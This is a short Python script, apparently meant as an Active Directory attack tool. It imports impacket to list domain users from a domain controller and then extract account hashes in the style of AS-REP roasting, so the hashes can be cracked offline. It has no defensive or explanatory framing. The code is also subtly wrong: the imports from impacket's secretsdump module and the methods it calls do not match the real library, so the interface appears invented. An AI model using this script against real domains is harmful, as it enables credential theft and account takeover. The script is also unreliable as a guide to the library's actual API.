from impacket.examples.secretsdump import GetADUsers, GetNPUsers

# Set the target domain and domain controller
target_domain = 'example.local'
domain_controller = 'dc.example.local'

# Create a GetADUsers object
get_ad_users = GetADUsers(target_domain, domain_controller)

# Extract user information
users = get_ad_users.get_users()

# Print the user information
for user in users:
    print(f'Username: {user["username"]}')
    print(f'Full name: {user["fullname"]}')
    print(f'Description: {user["description"]}')
    print(f'Password last set: {user["pwd_last_set"]}')
    print(f'Account expires: {user["account_expires"]}')
    print(f'Account disabled: {user["disabled"]}')
    print('---')

# Create a GetNPUsers object
get_np_users = GetNPUsers(target_domain, domain_controller)

# Extract user hashes
hashes = get_np_users.get_hashes()

# Print the user hashes
for hash in hashes:
    print(f'Username: {hash["username"]}')
    print(f'Hash: {hash["hash"]}')
    print('---')